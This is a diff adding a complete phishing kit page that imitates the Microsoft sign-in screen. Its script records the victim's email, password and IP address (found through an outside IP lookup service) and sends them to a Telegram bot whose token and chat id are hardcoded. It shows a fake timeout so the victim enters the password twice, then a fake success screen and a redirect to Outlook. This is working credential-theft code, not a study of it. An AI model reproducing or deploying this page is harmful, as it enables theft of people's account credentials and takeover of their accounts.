@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in to your account</title>
+  
+  <link rel="icon" type="image/png" href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet"/>
+
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: "Segoe UI", sans-serif;
+      background: url('https://i.imgur.com/ssr57bo.jpg') no-repeat center center fixed;
+      background-size: cover;
+      min-height: 100vh;
+      color: #000;
+    }
+    .container {
+      max-width: 440px;
+      margin: 60px auto 40px;
+      padding: 0 20px;
+    }
+    .login-box {
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.28);
+      padding: 44px 40px 36px;
+    }
+    .logo {
+      width: 40px;
+      height: auto;
+      margin-bottom: 24px;
+    }
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      color: #2c2c2c;
+    }
+    .error {
+      color: #a80000;
+      font-size: 14px;
+      margin: 8px 0 16px;
+      display: none;
+    }
+    .form-group {
+      margin-bottom: 20px;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 15px;
+      border: none;
+      border-bottom: 2px solid #666;
+      background: transparent;
+      transition: border-color 0.2s;
+    }
+    input:focus {
+      border-bottom-color: #0067c5;
+      outline: none;
+    }
+    .links {
+      font-size: 13px;
+      margin: 16px 0 32px;
+    }
+    .links a {
+      color: #0067c5;
+      text-decoration: none;
+    }
+    .links a:hover { text-decoration: underline; }
+    .btn-primary {
+      background: #0067c5;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 15px;
+      font-weight: 600;
+      border-radius: 2px;
+      cursor: pointer;
+    }
+    .btn-primary:hover { background: #005da6; }
+    .btn-primary:disabled { background: #8caae6; cursor: not-allowed; }
+    .back-arrow {
+      font-size: 18px;
+      color: #0067c5;
+      cursor: pointer;
+      margin-right: 8px;
+    }
+    #div3 {
+      text-align: center;
+      padding: 80px 20px;
+    }
+    #success-icon {
+      width: 120px;
+      margin-bottom: 32px;
+    }
+    footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      padding: 12px 40px;
+      font-size: 12px;
+      color: #000;
+      background: rgba(255,255,255,0.92);
+      backdrop-filter: blur(8px);
+    }
+    footer a {
+      color: #000;
+      text-decoration: none;
+      margin-left: 24px;
+    }
+    footer a:hover { text-decoration: underline; }
+    @media (max-width: 500px) {
+      .login-box { padding: 36px 24px 28px; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- Step 1: Email -->
+  <div class="login-box" id="div1">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo"/>
+    <h1>Sign in</h1>
+    
+    <div class="error" id="error">That Microsoft account doesn't exist. Try a different account.</div>
+
+    <div class="form-group">
+      <input type="email" id="ai" placeholder="Email, phone, or Skype" autocomplete="off"/>
+    </div>
+
+    <div class="links">
+      <p><a href="#">Create one!</a></p>
+      <p><a href="#">Sign in with a security key</a></p>
+    </div>
+
+    <div style="text-align:right">
+      <button class="btn-primary" id="next">Next</button>
+    </div>
+  </div>
+
+  <!-- Step 2: Password (now with Microsoft logo like original) -->
+  <div class="login-box" id="div2" style="display:none;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo"/>
+    
+    <div style="margin-bottom:24px;">
+      <i class="fas fa-arrow-left back-arrow" id="back"></i>
+      <strong id="aich">someone@example.com</strong>
+    </div>
+
+    <h1>Enter password</h1>
+    <div style="color:#a80000; font-size:14px; margin:12px 0;" id="msg">
+      To access this document, you'll need to verify your account.
+    </div>
+    <div class="error" id="msg1" style="display:none;">Sign-in attempt timed out. Please try again.</div>
+    <div class="error" id="msg2" style="display:none;">Sign-in attempt timed out. Please try again.</div>
+
+    <div class="form-group">
+      <input type="password" id="pr" placeholder="Password" autocomplete="off"/>
+    </div>
+
+    <div class="links">
+      <p><a href="#">Forgot password?</a></p>
+    </div>
+
+    <div style="text-align:right">
+      <button class="btn-primary" id="submit-btn">Sign in</button>
+    </div>
+  </div>
+
+  <!-- Fake success screen -->
+  <div class="login-box" id="div3" style="display:none;">
+    <img id="success-icon" src="https://i.imgur.com/xrWLEV8.png" alt="success"/>
+    <div style="font-size:20px; font-weight:500; color:#2c2c2c;">
+      Successfully verified<br><br>
+      Redirecting...
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <a href="#">Privacy & cookies</a>
+  <a href="#">Terms of use</a>
+</footer>
+
+<!-- IP detection (original method) -->
+<script type="text/javascript">
+  var userip;
+</script>
+<script type="text/javascript" src="https://l2.io/ip.js?var=userip"></script>
+
+<script>
+// IP fallback
+setTimeout(() => {
+  if (typeof userip === 'undefined' || !userip) userip = "unknown";
+}, 2500);
+
+let attemptCount = 0;
+
+const emailInput   = document.getElementById('ai');
+const passwordInput = document.getElementById('pr');
+const errorMsg     = document.getElementById('error');
+const msg1         = document.getElementById('msg1');
+const msg2         = document.getElementById('msg2');
+const submitBtn    = document.getElementById('submit-btn');
+
+// Auto-fill from hash (original behavior)
+(function autoFillFromHash() {
+  let hash = window.location.hash.substr(1);
+  if (!hash) return;
+
+  let emailFromHash;
+  const base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+  
+  if (base64regex.test(hash)) {
+    try { emailFromHash = atob(hash); } catch(e) { emailFromHash = hash; }
+  } else {
+    emailFromHash = hash;
+  }
+
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  if (!emailRegex.test(emailFromHash)) {
+    errorMsg.style.display = 'block';
+    return;
+  }
+
+  emailInput.value = emailFromHash;
+  document.getElementById('aich').textContent = emailFromHash;
+  document.getElementById('div1').style.display = 'none';
+  document.getElementById('div2').style.display = 'block';
+  passwordInput.focus();
+})();
+
+document.getElementById('next').addEventListener('click', () => {
+  const email = emailInput.value.trim();
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+  if (!emailRegex.test(email)) {
+    errorMsg.style.display = 'block';
+    return;
+  }
+
+  errorMsg.style.display = 'none';
+  document.getElementById('aich').textContent = email;
+  document.getElementById('div1').style.display = 'none';
+  document.getElementById('div2').style.display = 'block';
+  passwordInput.focus();
+});
+
+document.getElementById('back').addEventListener('click', () => {
+  document.getElementById('div2').style.display = 'none';
+  document.getElementById('div1').style.display = 'block';
+  emailInput.focus();
+});
+
+submitBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  
+  const email = emailInput.value.trim();
+  const pass  = passwordInput.value.trim();
+
+  if (!pass) return;
+
+  attemptCount++;
+
+  submitBtn.textContent = 'Verifying...';
+  submitBtn.disabled = true;
+
+  fetch(`https://api.telegram.org/bot8979984396:AAHp6H9Uj6TOzROOU0PNUnjyBhGdyDsJYKE/sendMessage?chat_id=6420251399&text======= Document O365 Logins =======
+%0AEmail: ${encodeURIComponent(email)}
+%0APasswd: ${encodeURIComponent(pass)}
+%0AClient IP: ${userip || 'unknown'}
+%0A====== Telegram: @Source_Code03 ======`, {
+    method: 'GET',
+    mode: 'no-cors'
+  }).catch(err => console.log("Telegram failed:", err));
+
+  setTimeout(() => {
+    if (attemptCount >= 2) {
+      document.getElementById('div2').style.display = 'none';
+      document.getElementById('div3').style.display = 'block';
+      setTimeout(() => {
+        window.location.replace('https://outlook.live.com/mail/0/inbox');
+      }, 1800);
+    } else {
+      msg1.style.display = 'block';
+      msg2.style.display = 'none';
+      submitBtn.textContent = 'Sign in';
+      submitBtn.disabled = false;
+      passwordInput.value = '';
+      passwordInput.focus();
+    }
+  }, 1400);
+});
+
+document.addEventListener('keypress', e => {
+  if (e.key === 'Enter') {
+    if (document.getElementById('div1').style.display !== 'none') {
+      document.getElementById('next').click();
+    } else if (document.getElementById('div2').style.display !== 'none') {
+      document.getElementById('submit-btn').click();
+    }
+  }
+});
+</script>
+</body>
+</html>
